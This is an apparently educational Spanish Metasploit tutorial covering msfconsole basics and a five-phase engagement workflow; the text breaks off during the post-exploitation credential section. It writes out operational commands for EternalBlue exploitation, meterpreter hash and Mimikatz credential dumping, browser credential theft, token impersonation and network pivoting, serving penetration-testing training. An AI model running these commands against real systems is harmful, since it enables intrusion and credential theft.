# Sección 2: Introducción a MSFconsole

## 🚀 Iniciando MSFconsole

Para comenzar a interactuar con Metasploit Framework, necesitamos escribir `msfconsole` en la terminal de nuestra elección.

### Distribuciones con MSFconsole Pre-instalado

Muchas distribuciones orientadas a seguridad vienen con `msfconsole` ya instalado:

- ✅ **Parrot Security OS**
- ✅ **Kali Linux**
- ✅ **BlackArch Linux**
- ✅ **BackBox**

### Flexibilidad de Línea de Comandos

Al igual que cualquier otra herramienta de línea de comandos, podemos usar varias opciones al lanzar el script:

- **Opciones gráficas**: Control de visualización
- **Opciones procedurales**: Automatización y scripting

---

## 🎨 Preparación: El Primer Contacto

### Lanzamiento Estándar de MSFconsole

Al ejecutar `msfconsole`, somos recibidos con:

1. **Arte ASCII (Splash Art)**: Banner artístico característico
2. **Prompt de comandos**: Esperando nuestro primer comando

```bash
CyberWolfSec@htb[/htb]$ msfconsole
```

**Salida típica**:
```
                                                  
                                              `:oDFo:`                            
                                           ./ymM0dayMmy/.                          
                                        -+dHJ5aGFyZGVyIQ==+-                    
                                    `:sm⏣~~Destroy.No.Data~~s:`                
                                 -+h2~~Maintain.No.Persistence~~h+-              
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:  
                      :we're.all.alike'`                     The.PFYroy.No.D7:  
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
                      :<script>.Ac816/                        sENbove3101.404:    
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
                      :#OUTHOUSE-  -s:                       /corykennedyData:    
                      :$nmap -oS                              SSo.6178306Ence:    
                      :Awsm.da:                            /shMTl#beats3o.No.:    
                      :Ring0:                             `dDestRoyREXKC3ta/M:    
                      :23d:                               sSETEC.ASTRONOMYist:    
                       /-                        /yo-    .ence.N:(){ :|: & };:    
                                                 `:Shall.We.Play.A.Game?tron/    
                                                 ```-ooy.if1ghtf0r+ehUser5`    
                                               ..th3.H1V3.U2VjRFNN.jMh+.`          
                                              `MjM~~WE.ARE.se~~MMjMs              
                                               +~KANSAS.CITY's~-`                  
                                                J~HAKCERS~./.`                    
                                                .esc:wq!:`                        
                                                 +++ATH`                            
                                                  `


       =[ metasploit v6.1.9-dev                           ]
+ -- --=[ 2169 exploits - 1149 auxiliary - 398 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use sessions -1 to interact with the last opened session

msf6 >
```

### 🎯 Interpretando el Banner de Inicio

El banner nos muestra información crucial:

#### Estadísticas del Framework

```
=[ metasploit v6.1.9-dev                           ]
```
**Versión actual** de Metasploit Framework

```
+ -- --=[ 2169 exploits - 1149 auxiliary - 398 post       ]
```
- **2169 exploits**: Módulos de explotación disponibles
- **1149 auxiliary**: Módulos auxiliares (escáneres, fuzzers, etc.)
- **398 post**: Módulos de post-explotación

```
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
```
- **592 payloads**: Cargas útiles disponibles
- **45 encoders**: Codificadores para evasión
- **10 nops**: Generadores de NOP

```
+ -- --=[ 9 evasion                                       ]
```
- **9 evasion**: Módulos de evasión de seguridad

#### 💡 Tip del Día

```
Metasploit tip: Use sessions -1 to interact with the last opened session
```

Cada vez que iniciamos MSFconsole, recibimos un **tip útil** que nos ayuda a aprender nuevas funcionalidades.

### Lanzamiento Silencioso (Modo Quiet)

Si preferimos evitar el banner artístico, podemos usar la opción `-q` (quiet):

```bash
CyberWolfSec@htb[/htb]$ msfconsole -q

msf6 >
```

**Ventajas del modo quiet**:
- ✅ Inicio más rápido
- ✅ Ideal para scripts automatizados
- ✅ Menos ruido visual
- ✅ Útil en conexiones remotas lentas

---

## 📚 Explorando los Comandos Disponibles

### Comando de Ayuda

Para ver todos los comandos disponibles:

```bash
msf6 > help
```

Este comando despliega una lista completa de todas las funcionalidades disponibles en MSFconsole.

> 💡 **Recomendación**: Ejecuta `help` y explora cada categoría de comandos. La familiaridad con los comandos disponibles es fundamental para un uso eficiente de la herramienta.

---

## 🔧 Manteniendo Actualizado Metasploit Framework

### La Importancia de las Actualizaciones

> **"Nuestras herramientas deben estar afiladas"**

Una de las **primeras cosas** que debemos hacer es asegurarnos de que:
- Los módulos que componen el framework estén **actualizados**
- Los nuevos módulos disponibles públicamente puedan ser **importados**

### Método Antiguo vs. Método Actual

#### ❌ Método Antiguo (OBSOLETO)

```bash
# NO recomendado actualmente
msfupdate
```

Este comando solía ejecutarse en la terminal del sistema operativo (fuera de msfconsole) para actualizar el framework.

#### ✅ Método Actual (RECOMENDADO)

El **gestor de paquetes APT** ahora maneja las actualizaciones de módulos y características sin esfuerzo:

```bash
sudo apt update && sudo apt install metasploit-framework
```

### Proceso de Instalación/Actualización

**Comando completo**:
```bash
CyberWolfSec@htb[/htb]$ sudo apt update && sudo apt install metasploit-framework
```

**Salida típica**:
```
<SNIP>

(Reading database ... 414458 files and directories currently installed.)
Preparing to unpack .../metasploit-framework_6.0.2-0parrot1_amd64.deb ...
Unpacking metasploit-framework (6.0.2-0parrot1) over (5.0.88-0kali1) ...
Setting up metasploit-framework (6.0.2-0parrot1) ...
Processing triggers for man-db (2.9.1-1) ...
Scanning application launchers
Removing duplicate launchers from Debian
Launchers are updated
```

### ¿Qué se Actualiza?

- ✅ **Nuevos exploits** añadidos por la comunidad
- ✅ **Correcciones de bugs** en módulos existentes
- ✅ **Nuevos payloads** y técnicas de evasión
- ✅ **Mejoras de rendimiento** en el framework
- ✅ **Actualizaciones de seguridad** críticas

---

## 🔍 Antes de Explotar: El Proceso de Enumeración

### Paso Fundamental

Uno de los **primeros pasos** que cubriremos en este módulo es **buscar un exploit apropiado** para nuestro objetivo.

### ⚠️ Advertencia Importante

> **No podemos explotar lo que no conocemos**

Necesitamos tener una **perspectiva detallada del objetivo** antes de intentar cualquier explotación. Esto implica el proceso de **Enumeración**, que **precede** cualquier tipo de intento de explotación.

---

## 🎯 El Proceso de Enumeración Explicado

### ¿Qué es la Enumeración?

La **Enumeración** es el proceso de recopilar información detallada sobre el objetivo para identificar posibles vectores de ataque.

### Pasos Clave de la Enumeración

#### 1. **Identificar Servicios Públicamente Accesibles**

Durante la enumeración, debemos observar nuestro objetivo e identificar qué servicios de cara al público están ejecutándose en él.

**Preguntas fundamentales**:
- ¿Es un servidor HTTP? 
- ¿Es un servidor FTP?
- ¿Es una base de datos SQL?
- ¿Qué otros servicios están expuestos?

#### 2. **Determinar Versiones de Servicios**

> 🔑 **Las versiones son los componentes clave** durante el proceso de enumeración que nos permitirán determinar si el objetivo es vulnerable o no.

**Ejemplos de información a recopilar**:
```
Apache HTTP Server 2.4.29
OpenSSH 7.6p1
MySQL 5.7.33
ProFTPD 1.3.5
```

#### 3. **Escaneo Exhaustivo**

Necesitamos comenzar con un **escaneo exhaustivo** de la dirección IP del objetivo para determinar:
- ✅ **Qué servicio** está ejecutándose
- ✅ **Qué versión** está instalada para cada servicio
- ✅ **Configuraciones** expuestas
- ✅ **Puertos abiertos** y sus estados

### Tipos de Objetivos

Estas diferentes **tipologías de objetivos** varían sustancialmente en el mundo real:

| Tipo de Servicio | Ejemplo | Puerto Típico |
|------------------|---------|---------------|
| **Servidor Web** | Apache, Nginx, IIS | 80, 443 |
| **Servidor FTP** | ProFTPD, vsftpd | 21 |
| **Base de Datos** | MySQL, PostgreSQL, MSSQL | 3306, 5432, 1433 |
| **SSH** | OpenSSH | 22 |
| **SMB** | Samba, Windows File Sharing | 445, 139 |
| **Email** | Postfix, Exchange | 25, 110, 143 |

---

## 🚪 Identificando el Punto de Entrada

### Versiones Sin Parches

> **Las versiones sin parches de servicios previamente vulnerables** serán a menudo nuestro punto de entrada al sistema objetivo.

**Escenario típico**:
```
Servicio encontrado: Apache 2.4.29
Investigación: CVE-2019-0211 (Privilege Escalation)
Estado: VULNERABLE (sin parchar)
Acción: Buscar exploit en Metasploit
```

### Código Desactualizado

> **Código desactualizado en una plataforma accesible públicamente** será a menudo nuestro punto de entrada al sistema objetivo.

**Ejemplos comunes**:
- WordPress con plugins antiguos
- CMS (Drupal, Joomla) sin actualizar
- Paneles de administración con versiones antiguas
- Aplicaciones web custom sin mantenimiento

---

## 📊 Estructura de Compromiso de MSF

La estructura de compromiso de MSF puede dividirse en **cinco categorías principales**:

```
1. ENUMERACIÓN
   ↓
2. PREPARACIÓN
   ↓
3. EXPLOTACIÓN
   ↓
4. ESCALADA DE PRIVILEGIOS
   ↓
5. POST-EXPLOTACIÓN
```

### Beneficios de Esta Estructura

Esta división facilita:
- ✅ **Encontrar características** apropiadas de MSF de manera más estructurada
- ✅ **Seleccionar módulos** de forma organizada
- ✅ **Trabajar sistemáticamente** siguiendo una metodología clara
- ✅ **Documentar procesos** de manera ordenada

### Subcategorías Especializadas

Cada una de estas categorías tiene diferentes **subcategorías** destinadas a propósitos específicos:

- **Service Validation** (Validación de Servicios)
- **Vulnerability Research** (Investigación de Vulnerabilidades)
- **Code Auditing** (Auditoría de Código)
- **Module Execution** (Ejecución de Módulos)
- **Pivoting** (Pivoteo)
- **Data Exfiltration** (Exfiltración de Datos)

---

## 🗺️ Flowchart: Estructura Completa de Compromiso

A continuación, desglosamos cada fase de la estructura de compromiso basándonos en el diagrama oficial:

### 📌 Fase 1: ENUMERACIÓN

```
ENUMERACIÓN
├── Service Validation (Validación de Servicios)
│   ├── Passive Scanning (Escaneo Pasivo)
│   │   ├── OSINT
│   │   ├── Interacting with services legitimately
│   │   └── whois / DNS records
│   │
│   └── Active Scanning (Escaneo Activo)
│       ├── nMap / Nessus / NexPose scans
│       ├── Web service identification tools
│       └── Built-with identification tools
│
└── Vulnerability Research (Investigación de Vulnerabilidades)
    ├── VulnDB (GUI)
    ├── Rapid7 (GUI)
    ├── SearchSploit (CLI)
    └── Google Dorking (GUI)
    
    → Workflow: > search [vuln. name] → > use [index no.]
    → Proceed to Preparation
```

**Explicación detallada**:

#### Service Validation (Validación de Servicios)

**Passive Scanning (Escaneo Pasivo)**:

Técnicas que **no interactúan directamente** con el objetivo de forma intrusiva:

- **OSINT (Open Source Intelligence)**: 
  - Recopilación de información de fuentes públicas
  - Redes sociales, registros públicos, sitios web
  - Google Hacking, Shodan, Censys
  
- **Interacting with services legitimately**: 
  - Interactuar con servicios de forma normal y legítima
  - Navegar el sitio web como un usuario común
  - Leer documentación pública
  - Observar comportamientos sin generar alertas
  
- **whois / DNS records**: 
  - Consultar registros de dominio (whois)
  - Registros DNS (A, MX, TXT, etc.)
  - Información de contacto y organización
  - Subdominios y registros históricos

**Active Scanning (Escaneo Activo)**:

Técnicas que **interactúan directamente** con el objetivo:

- **nMap / Nessus / NexPose scans**: 
  - **nMap**: Escaneo de puertos y detección de servicios
  - **Nessus**: Escáner de vulnerabilidades comercial
  - **NexPose**: Escáner de vulnerabilidades de Rapid7
  - Detección de versiones de software
  - Fingerprinting de sistemas operativos
  
- **Web service identification tools**: 
  - Identificación del servidor web (Apache, Nginx, IIS)
  - Detección de versiones específicas
  - Headers HTTP reveladores
  - Tecnologías de backend
  
- **Built-with identification tools**: 
  - **BuiltWith**: Identifica tecnologías usadas en sitios web
  - **Wappalyzer**: Extensión de navegador para detección de tecnologías
  - **WhatWeb**: Herramienta CLI para identificar CMS, frameworks, librerías
  - Detecta: CMS (WordPress, Joomla), frameworks (React, Laravel), CDNs, analytics

#### Vulnerability Research (Investigación de Vulnerabilidades)

**Bases de datos de exploits y vulnerabilidades**:

- **VulnDB (GUI)**: 
  - Base de datos de vulnerabilidades con interfaz gráfica
  - Información detallada de CVEs
  - Exploits disponibles y PoCs
  
- **Rapid7 (GUI)**: 
  - Base de datos de Metasploit
  - Módulos verificados y mantenidos
  - Interfaz web para búsqueda
  
- **SearchSploit (CLI)**: 
  - Herramienta de línea de comandos
  - Busca en la base de datos de Exploit-DB
  - Rápida y eficiente para terminal
  
  ```bash
  searchsploit apache 2.4.29
  searchsploit -m 12345  # Copiar exploit
  ```
  
- **Google Dorking (GUI)**: 
  - Búsqueda avanzada en Google
  - Operadores especiales para encontrar CVEs
  - Descubrimiento de información sensible expuesta
  
  ```
  site:exploit-db.com "Apache 2.4.29"
  inurl:exploit filetype:rb
  ```

**Workflow de Metasploit**:

Una vez identificada una vulnerabilidad:

```bash
# Buscar el módulo por nombre de vulnerabilidad
msf6 > search [vuln. name]

# Ejemplo
msf6 > search eternal blue

# Usar el módulo por su índice
msf6 > use [index no.]

# Ejemplo
msf6 > use 0
```

**Transición**: Una vez identificado el exploit apropiado → **Proceed to Preparation**

### 📌 Fase 2: PREPARACIÓN

```
PREPARACIÓN
├── Code Auditing (Auditoría de Código)
├── Dependency Check (Verificación de Dependencias)
└── Importing Custom Modules (Importación de Módulos Personalizados)
    
    → Proceed to Exploitation
```

**Explicación detallada**:

#### Code Auditing (Auditoría de Código)

**Propósito**: Revisar el código del exploit antes de ejecutarlo

**Qué verificar**:
- ✅ Leer el código fuente del módulo
- ✅ Entender qué hace exactamente el exploit
- ✅ Identificar posibles efectos secundarios
- ✅ Verificar que no contenga código malicioso
- ✅ Comprender el mecanismo de explotación

**Ejemplo de auditoría**:
```bash
# Ver la ubicación del módulo
msf6 exploit(windows/smb/ms17_010_eternalblue) > info

# Editar y revisar el código
nano /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb
```

**Preguntas a responder**:
- ¿Qué hace este exploit exactamente?
- ¿Puede causar daño al sistema objetivo?
- ¿Deja rastros o logs evidentes?
- ¿Es estable o puede causar crashes?

#### Dependency Check (Verificación de Dependencias)

**Propósito**: Asegurar que todas las dependencias necesarias estén presentes

**Qué verificar**:
- ✅ Librerías de Ruby requeridas
- ✅ Herramientas externas necesarias
- ✅ Versiones compatibles de software
- ✅ Permisos y privilegios necesarios
- ✅ Conectividad de red requerida

**Ejemplo**:
```bash
# Verificar dependencias de un módulo
msf6 exploit(windows/smb/ms17_010_eternalblue) > check

# Instalar gemas de Ruby si es necesario
gem install <nombre_gema>
```

**Dependencias comunes**:
- Gemas de Ruby específicas
- Binarios del sistema (nmap, john, etc.)
- Librerías de sistema (libssl, libpcap, etc.)
- Python y módulos Python

#### Importing Custom Modules (Importación de Módulos Personalizados)

**Propósito**: Cargar exploits personalizados o modificados en Metasploit

**Proceso de importación**:

1. **Ubicar el directorio correcto**:
```bash
# Módulos de usuario
~/.msf4/modules/

# O módulos del sistema
/usr/share/metasploit-framework/modules/
```

2. **Copiar el módulo**:
```bash
# Copiar exploit personalizado
cp mi_exploit.rb ~/.msf4/modules/exploits/custom/

# Estructura de carpetas
mkdir -p ~/.msf4/modules/exploits/custom/
```

3. **Recargar módulos en msfconsole**:
```bash
msf6 > reload_all
[*] Reloading modules from all module paths...
```

4. **Verificar que se cargó**:
```bash
msf6 > search custom
```

**Ejemplo de módulo personalizado**:
```ruby
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Mi Exploit Personalizado',
      'Description'    => %q{
        Descripción de lo que hace el exploit
      },
      'Author'         => [ 'Tu Nombre' ],
      'License'        => MSF_LICENSE,
      'Platform'       => 'win',
      'Targets'        => [
        [ 'Windows XP SP3', { 'Ret' => 0x77c35459 } ]
      ],
      'DefaultTarget'  => 0
    ))
  end

  def exploit
    # Código de explotación
    connect
    sock.put(payload.encoded)
    handler
    disconnect
  end
end
```

**Transición**: Una vez preparado el entorno → **Proceed to Exploitation**

### 📌 Fase 3: EXPLOTACIÓN

```
EXPLOTACIÓN
├── Run Module Locally (Ejecutar Módulo Localmente)
│
└── Set Parameters (Establecer Parámetros)
    │
    ├── Options (> show options)
    │   ├── URI
    │   ├── PROXIES
    │   ├── RHOST / RPORT
    │   ├── USERNAMES
    │   ├── PASSWORDS
    │   ├── DICTIONARIES
    │   └── SESSION
    │   
    │   → > set [option] [value]
    │
    ├── Payloads (> show payloads)
    │   ├── METERPRETER
    │   ├── SHELL BINDS
    │   ├── REVERSE SHELLS
    │   └── EXE
    │   
    │   → > set payload [index no.]
    │
    ├── Targets (> show targets)
    │   ├── LINUX
    │   ├── WINDOWS
    │   ├── MACOSX
    │   └── OTHERS
    │   
    │   → > set target [OS]
    │
    └── Run (Ejecutar)
        → Loop back to beginning or continue
```

**Explicación detallada**:

#### Run Module Locally (Ejecutar Módulo Localmente)

**Propósito**: Prueba del exploit antes del ataque real

**Razones para ejecutar localmente**:
- ✅ Verificar que el módulo funcione correctamente
- ✅ Probar en un entorno controlado
- ✅ Evitar exponer al cliente a exploits no probados
- ✅ Validar payloads y configuraciones

**Ejemplo**:
```bash
# Configurar para prueba local
msf6 exploit(multi/handler) > set LHOST 127.0.0.1
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit
```

#### Set Parameters (Establecer Parámetros)

Esta fase implica configurar todos los parámetros necesarios antes de ejecutar el exploit.

##### 1. **Options (> show options)**

**Comando para ver opciones**:
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
```

**Parámetros comunes**:

- **URI**: 
  - Ruta específica en el servidor web objetivo
  - Ejemplo: `/admin/login.php`
  - Usado en exploits de aplicaciones web
  
- **PROXIES**: 
  - Configuración de proxy para enrutar el ataque
  - Formato: `type:host:port`
  - Ejemplo: `socks5:127.0.0.1:9050` (Tor)
  - Útil para anonimato o bypass de restricciones
  
- **RHOST / RPORT**: 
  - **RHOST**: Remote Host (IP o hostname del objetivo)
  - **RPORT**: Remote Port (puerto del servicio vulnerable)
  - Ejemplos: 
    ```bash
    set RHOST 192.168.1.100
    set RPORT 445  # SMB
    ```
  
- **USERNAMES**: 
  - Nombre(s) de usuario para autenticación
  - Puede ser un solo usuario o una lista
  - Usado en ataques de fuerza bruta
  
- **PASSWORDS**: 
  - Contraseña(s) para probar
  - Puede ser una lista (diccionario)
  - Usado en ataques de fuerza bruta
  
- **DICTIONARIES**: 
  - Ruta a archivos de diccionario
  - Wordlists para ataques de fuerza bruta
  - Ejemplo: `/usr/share/wordlists/rockyou.txt`
  
- **SESSION**: 
  - ID de sesión existente para usar
  - Útil en post-explotación
  - Permite usar sesiones ya establecidas

**Establecer opciones**:
```bash
# Sintaxis general
> set [option] [value]

# Ejemplos prácticos
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RPORT 445
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15
```

##### 2. **Payloads (> show payloads)**

**Comando para ver payloads disponibles**:
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
```

**Tipos de payloads**:

- **METERPRETER**: 
  - Shell avanzado de Metasploit
  - Funciona en memoria (sin escribir en disco)
  - Módulos de post-explotación integrados
  - Comandos avanzados: hashdump, screenshot, webcam, keylogger
  - Migración entre procesos
  - Ejemplo: `windows/x64/meterpreter/reverse_tcp`
  
- **SHELL BINDS**: 
  - Shell que escucha en el objetivo (bind)
  - El atacante se conecta al objetivo
  - Menos común debido a firewalls
  - Útil cuando no hay restricciones de firewall saliente
  - Ejemplo: `windows/shell/bind_tcp`
  
- **REVERSE SHELLS**: 
  - Shell que se conecta desde el objetivo al atacante
  - Más común, bypasea firewalls salientes
  - El objetivo inicia la conexión
  - Ejemplo: `windows/shell/reverse_tcp`
  
- **EXE**: 
  - Payload como ejecutable standalone
  - Archivo .exe que puede ejecutarse independientemente
  - Útil para ataques de ingeniería social
  - Ejemplo: `windows/meterpreter/reverse_tcp` generado como .exe

**Establecer payload**:
```bash
# Sintaxis
> set payload [index no.]

# O por nombre completo
> set payload windows/x64/meterpreter/reverse_tcp
```

**Comparación de payloads**:

| Tipo | Ventajas | Desventajas | Uso Recomendado |
|------|----------|-------------|-----------------|
| **Meterpreter** | Funcionalidad completa, en memoria | Más detectable por AV | Post-explotación avanzada |
| **Shell Reverse** | Simple, ligero | Funcionalidad limitada | Acceso rápido básico |
| **Shell Bind** | No requiere listener externo | Bloqueado por firewalls | Redes sin firewall |
| **EXE** | Standalone, portable | Requiere ejecución manual | Ingeniería social |

##### 3. **Targets (> show targets)**

**Comando para ver targets disponibles**:
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show targets
```

**Sistemas operativos objetivo**:

- **LINUX**: 
  - Distribuciones Linux (Ubuntu, CentOS, Debian, etc.)
  - Diferentes versiones de kernel
  - Arquitecturas: x86, x64, ARM
  
- **WINDOWS**: 
  - Versiones de Windows (XP, 7, 8, 10, 11, Server)
  - Diferentes service packs
  - Arquitecturas: x86, x64
  - Ejemplos: 
    ```
    Windows 7 SP1 x64
    Windows Server 2012 R2
    Windows 10 Build 1909
    ```
  
- **MACOSX**: 
  - Versiones de macOS / Mac OS X
  - Diferentes arquitecturas (Intel, M1/M2)
  
- **OTHERS**: 
  - Sistemas operativos menos comunes
  - Dispositivos embebidos
  - Routers, IoT devices
  - Sistemas Unix propietarios

**Establecer target**:
```bash
# Sintaxis
> set target [OS]

# Ejemplos
> set target 0  # Por índice
> set target Windows 7 SP1 x64  # Por nombre
```

**¿Por qué es importante el target?**
- Cada sistema operativo tiene diferentes offsets de memoria
- Diferentes métodos de explotación según arquitectura
- Shellcode específico para cada plataforma
- Exploit puede fallar si el target es incorrecto

##### 4. **Run (Ejecutar)**

**Comandos de ejecución**:

```bash
# Ejecutar el exploit
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

# O usar 'run' (equivalente)
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

# Ejecutar como job en background
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -j

# Ejecutar sin verificar sesión
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z
```

**Flujo después de Run**:

```
Run → ¿Exploit exitoso?
       ├── SÍ → Sesión establecida → Post-Explotación
       └── NO → Volver al inicio
                ├── Revisar configuración
                ├── Probar otro payload
                ├── Verificar target correcto
                └── Buscar otro exploit
```

### 📌 Fase 4: ESCALADA DE PRIVILEGIOS

```
PRIVILEGE ESCALATION (ESCALADA DE PRIVILEGIOS)
├── Vulnerability Research (Investigación de Vulnerabilidades)
│
├── Credential Gathering (Recolección de Credenciales)
│
└── Token Impersonation (Suplantación de Tokens)

    → Return to Enumeration, repeat until highest privilege obtained
    → (Volver a Enumeración, repetir hasta obtener máximo privilegio)
```

**Explicación detallada**:

#### Vulnerability Research (Investigación de Vulnerabilidades)

**Propósito**: Buscar vulnerabilidades de escalada de privilegios en el sistema comprometido

**Proceso de investigación**:

1. **Identificar privilegios actuales**:
```bash
# En Windows
whoami
whoami /priv

# En Linux
id
sudo -l
```

2. **Enumerar el sistema**:
```bash
# En Meterpreter
meterpreter > sysinfo
meterpreter > getuid

# Versión del sistema operativo
meterpreter > run post/windows/gather/enum_patches
```

3. **Buscar exploits locales**:
```bash
# En msfconsole
msf6 > search platform:windows type:exploit local

# Buscar por versión específica
msf6 > search windows 10 privilege escalation
```

**Ejemplos de vulnerabilidades comunes**:

| Sistema | Vulnerabilidad | Técnica |
|---------|---------------|---------|
| Windows | MS16-032 | Secondary Logon Handle Privilege Escalation |
| Windows | PrintSpoofer | Print Spooler Service Abuse |
| Linux | DirtyCow | Kernel Exploit (CVE-2016-5195) |
| Linux | SUID Binaries | Binarios con permisos SUID mal configurados |

**Nota importante**: La imagen menciona **"Return to Enumeration"** - esto significa que si no logramos escalar privilegios, debemos volver a enumerar el sistema más profundamente.

#### Credential Gathering (Recolección de Credenciales)

**Propósito**: Obtener credenciales que puedan tener mayores privilegios

**Técnicas de recolección**:

1. **Dump de hashes de contraseñas**:
```bash
# En Meterpreter (Windows)
meterpreter > hashdump
meterpreter > run post/windows/gather/smart_hashdump

# Extraer credenciales de memoria
meterpreter > load kiwi
meterpreter > creds_all
```

2. **Buscar contraseñas en archivos**:
```bash
# Archivos de configuración
meterpreter > search -f config.php
meterpreter > search -f web.config
meterpreter > search -f unattend.xml

# Credenciales en registro (Windows)
meterpreter > run post/windows/gather/credentials/windows_autologin
```

3. **Credenciales en memoria**:
```bash
# Mimikatz a través de Meterpreter
meterpreter > load kiwi
meterpreter > kiwi_cmd privilege::debug
meterpreter > kiwi_cmd sekurlsa::logonpasswords
```

4. **Archivos de navegadores**:
```bash
# Credenciales guardadas en navegadores
meterpreter > run post/multi/gather/firefox_creds
meterpreter > run post/windows/gather/enum_chrome
```

**Fuentes comunes de credenciales**:

- 📁 **Archivos de configuración**: `config.php`, `.env`, `web.config`
- 🔑 **Registro de Windows**: Autologin, VNC, etc.
- 💾 **Bases de datos locales**: SQLite, archivos de configuración de DB
- 🌐 **Navegadores**: Contraseñas guardadas, cookies de sesión
- 📝 **Archivos de texto**: Notas, documentos con credenciales
- 🗃️ **Historial de comandos**: `.bash_history`, PowerShell history

#### Token Impersonation (Suplantación de Tokens)

**Propósito**: Robar tokens de autenticación de procesos con mayores privilegios

**Concepto**: En Windows, cada proceso tiene un **token de acceso** que define sus privilegios. Podemos "robar" tokens de procesos que corren con mayores privilegios.

**Técnicas**:

1. **Listar tokens disponibles**:
```bash
# En Meterpreter
meterpreter > use incognito
meterpreter > list_tokens -u

# Salida ejemplo:
Delegation Tokens Available
========================================
NT AUTHORITY\SYSTEM
DOMAIN\Administrator
```

2. **Suplantar un token**:
```bash
# Impersonar token de SYSTEM
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"

# Verificar privilegios
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

3. **Migrar a proceso privilegiado**:
```bash
# Listar procesos
meterpreter > ps

# Migrar a un proceso de SYSTEM
meterpreter > migrate 1234
```

**Privilegios requeridos**:
- `SeImpersonatePrivilege`
- `SeAssignPrimaryTokenPrivilege`

**Exploits comunes de Token Impersonation**:
- **Juicy Potato**: Explotación de SeImpersonate en Windows
- **Rotten Potato**: Versión antigua
- **PrintSpoofer**: Abuse del servicio Print Spooler

**Ciclo de repetición**:

> **"Return to Enumeration, repeat until highest privilege obtained"**

Si después de intentar escalar privilegios no obtenemos el nivel deseado (generalmente SYSTEM en Windows o root en Linux), debemos:

1. ↩️ **Volver a Enumeración**
2. 🔍 Buscar información que nos hayamos perdido
3. 🔄 Intentar otra técnica de escalada
4. ♻️ Repetir el ciclo hasta obtener **máximos privilegios**

### 📌 Fase 5: POST-EXPLOTACIÓN

```
POST-EXPLOITATION (POST-EXPLOTACIÓN)
├── Pivoting to Other Systems (Pivoteo a Otros Sistemas)
│
├── Credential Gathering (Recolección de Credenciales)
│
├── Data Exfiltration (Exfiltración de Datos)
│
└── Cleanup (Limpieza)
```

**Explicación detallada**:

#### Pivoting to Other Systems (Pivoteo a Otros Sistemas)

**Propósito**: Usar el sistema comprometido como **trampolín** para atacar otros sistemas en la red interna

**Concepto**: El pivoting nos permite alcanzar sistemas que no son accesibles directamente desde nuestra máquina atacante.

**Escenario típico**:
```
Internet
   ↓
[Firewall] 
   ↓
Sistema Web Comprometido (DMZ) ← Tenemos acceso aquí
   ↓
[Red Interna] ← NO accesible desde Internet
   ├── Base de Datos
   ├── Servidor de Archivos  
   ├── Controlador de Dominio
   └── Estaciones de Trabajo
```

**Técnicas de pivoting en Metasploit**:

1. **Agregar ruta (Route)**:
```bash
# En Meterpreter
meterpreter > run autoroute -s 192.168.100.0/24

# Ver rutas configuradas
meterpreter > run autoroute -p
```

2. **Port Forwarding**:
```bash
# Reenviar puerto 3389 del objetivo a nuestro puerto local
meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.100.10

# Ahora podemos conectarnos localmente
rdesktop 127.0.0.1:3389
```

3. **Proxy SOCKS**:
```bash
# Iniciar servidor SOCKS
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > run -j

# Configurar proxychains
nano /etc/proxychains.conf
# Agregar: socks4 127.0.0.1 1080

# Usar con cualquier herramienta
proxychains nmap 192.168.100.10
```

4. **Túneles SSH**:
```bash
# Desde Meterpreter, subir chisel o similar
meterpreter > upload chisel.exe C:\\Windows\\Temp\\

# Crear túnel reverso
```

**Workflow de pivoting**:
```
1. Comprometer Sistema A (DMZ)
2. Enumerar red interna desde Sistema A
3. Configurar pivoting (autoroute/portfwd/socks)
4. Escanear red interna a través de Sistema A
5. Explotar Sistema B en red interna
6. Repetir proceso si es necesario
```

#### Credential Gathering (Recolección de Credenciales)

**Propósito**: Obtener credenciales para **movimiento lateral** a otros sistemas

**Diferencia con Fase 4**: Aquí las credenciales se usan para acceder a OTROS sistemas, no para escalar en el sistema actual.

**Técnicas**:

1. **Extracción de credenciales del sistema**:
```bash
# Hashes de contraseñas
meterpreter > hashdump

# Credenciales en texto plano (Mimikatz)
meterpreter > load kiwi
meterpreter > creds_msv
meterpreter > creds_wdigest
```

2. **Buscar credenciales almacenadas**:
```bash
# Scripts guardados
meterpreter > search -f *.ps1
meterpreter > search -f *.bat

# Historial de comandos
meterpreter > cat C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
```

3. **Credenciales de servicios**:
```bash
# Credenciales de servicios Windows
